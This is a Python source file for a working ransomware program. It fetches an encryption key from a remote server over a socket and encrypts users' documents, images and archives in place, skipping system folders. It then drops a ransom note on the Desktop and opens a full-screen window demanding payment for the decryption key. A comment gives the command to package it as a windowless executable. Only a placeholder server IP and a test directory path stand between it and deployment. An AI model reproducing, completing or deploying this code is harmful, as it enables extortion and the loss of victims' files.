import os
from cryptography.fernet import Fernet
import tkinter as tk
import socket
from tkinter import *
from tkinter import messagebox
import shutil

#python -m PyInstaller --onefile -w encrypt.py

#get key from server
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
IP_ADDRESS = 'Server IP here'
PORT = 9090
client_socket.connect((IP_ADDRESS, PORT))
key = client_socket.recv(1024)

# Define directories to exclued and file extensions to encrypt
EXCLUDED_DIRECTORIES = ('Program Files',
                        'Program Files (x86)',
                        'Windows',
                        '$Recycle.Bin',
                        'AppData',
                        'ransom',
        )

EXTENSIONS = ( 
        '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
        '.odt', '.odp', '.ods', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
        '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
        '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
)

# Define function to fine files to encrypt 
def find_files():
    file_paths = []
    directory = r'TEST/DIRECTORY/HERE'
    #f = open("paths/path.txt","w")
    for root, dirs, files in os.walk(directory):
        if any(s in root for s in EXCLUDED_DIRECTORIES):
            pass
        else:
            for file in files:
                if file.endswith(EXTENSIONS):
                    TARGET = os.path.join(root, file)
                    file_paths.append(TARGET)
                    #f.write(TARGET+'\n')
                    print(root)
    #f.close()
    return file_paths
                    
# Define function to encrypt a single file
def encrypt_file(filename):
    # initialize a fernet object with the encryption key
    fernet = Fernet(key)
    # read the contents of the file
    with open(filename, "rb") as file:
        file_content = file.read()
    # encrypt the file's contents
    encrypted_content = fernet.encrypt(file_content)
    # overwrite the original file with the encrypted content
    with open(filename, "wb") as file:
        file.write(encrypted_content)
    # print the filename to indicate which file was encrypted
    print(filename)

# Finds files to encrypt
file_paths = find_files()

# Defines function to encrypt all files
def encrypt_all():
    # get desktop path and create new directory for ransom
    desktop_path = os.path.expanduser("~/Desktop")
    new_directory = "ransom"
    new_directory = os.path.join(desktop_path, new_directory)
    os.mkdir(new_directory)
    
    # set ransom note file path
    ransom_note = "ransom.txt"
    ransom_path = os.path.join(new_directory, ransom_note)
    
    # Encrypt each file in file_paths
    for file in file_paths:
        # strio white spaces and encrypt file
        current_file = file.strip()
        encrypt_file(current_file)
    # Write ransom note    
    with open(ransom_path, "w") as ransom_file:
        ransom_file.write("You will recive your decryption key once you have paid the rasom\n")
        ransom_file.write("Do not attempt to decrypt on your own")
        ransom_file.write("Do not move any files from their original location")

# Define function to display decryption screen        
def decryption_screen():
    # Create root window
    root = tk.Tk()
    # get screen dimesnsions
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    # Set window dimensions and background color
    gap = (screen_height/50)
    # Set window dimensions and background color
    root.geometry(f"{screen_width}x{screen_height}")
    root.configure(background="blue")
    # Create label for displaying the encrypted message
    labe1 = tk.Label(root, text="YOUR IMPORTANT FILES HAVE BEEN ENCRYPTED")
    labe1.config(font=('tohoma', int(gap)))
    labe1.config(background='blue',foreground='white')
    labe1.pack(anchor='n', ipady=20)
    

    # Create label for displaying instructions to unlock the encryption
    labe3 = tk.Label(root, text="To unlock the encryption you will need a decryption key.")
    labe3.config(font=('tahoma', int(gap)))
    labe3.config(background="blue", foreground="white")
    labe3.pack(anchor='n', ipady=20)

    # Create label for displaying teh message to input the decryption key
    labe4 = tk.Label(root, text="You will recieve the key once you have paid the ransom.\nInput the key below:")
    labe4.config(font=('tahoma',int(gap)))
    labe4.config(background='blue',foreground='white')
    labe4.pack(anchor='n', ipady=20)
    

    def decrypt_all():
        # get user input from entry widget
        try:
            user_input = entry.get()
            # check if user input matches the key
            if user_input != key.decode():
                raise ValueError("Incorrect key")
        # show an error message if an incorrect key is entered
        except ValueError as e:
            messagebox.showerror("Error", e)
            return


        # Define a function to decrypt an individual file
        def decrypt_file(filename):
            # create Fernet instance with user input
            fernet = Fernet(user_input)
            # read encrypted file content
            with open(filename, "rb") as file:
                file_content = file.read()
            # decrypt file content    
            decrypted_content = fernet.decrypt(file_content)
            # write decrypted content back to file
            with open(filename, "wb") as file:
                file.write(decrypted_content)
            #print name of file that has been decrypted
            print(filename)
        # loop through all file paths and decrypt each file
        for file in file_paths:
            decrypt_file(file)
        # show a success message after all files have been decrypted
        messagebox.showinfo("Success", "Your Files have been decrypted!")
        # get desktop path and delete ransom note directory
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
        ransom_note_dir = "ransom"
        ransom_note_path = os.path.join(desktop_path, ransom_note_dir)
        shutil.rmtree(ransom_note_path)
        # destroy the root window
        root.destroy()

    # create an entry widget for user to input decryption key
    entry = tk.Entry(root, width=int(screen_width/10))
    entry.pack(anchor='n', ipady=20)

    # create a canvas
    canvas1 = tk.Canvas(root, bg='blue', highlightthickness=0, height=20, width=screen_width)
    canvas1.pack()

    # create a submit button to innitiate decryption process
    key_submit = tk.Button(root, text='Submit', command=decrypt_all)
    key_submit.pack(anchor='n')

    # start the main loop
    root.mainloop()





if __name__ == '__main__':
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    ransom_note_directory = "ransom"
    ransom_note_path = os.path.join(desktop_path, ransom_note_directory)

    if os.path.exists(ransom_note_path) is False:
        encrypt_all()
        decryption_screen()
    else:
        decryption_screen()
